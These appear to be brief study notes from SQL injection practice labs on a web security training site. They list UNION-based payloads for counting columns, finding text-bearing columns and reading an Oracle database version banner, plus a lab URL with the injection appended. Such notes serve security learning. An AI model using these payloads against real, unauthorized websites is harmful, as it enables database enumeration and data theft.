Goal--> Finding the version of database
Finding the number of columns
' order by 2--

' union select NULL,NULL FROM DUAL--

Column containing the text
' union select 'a','b' FROM DUAL--

Finding the version of database
' union select banner,NULL FROM v$version--

Lab #03
SQL injection UNION attack, determining the number of columns returned by the query
Finding Number of column

https://0a0f0059049847db8140252c009400e7.web-security-academy.net/filter?category=Gifts' order by 3--
Injection: ' order by 3--
or
' union select NULL,NULL,Null --
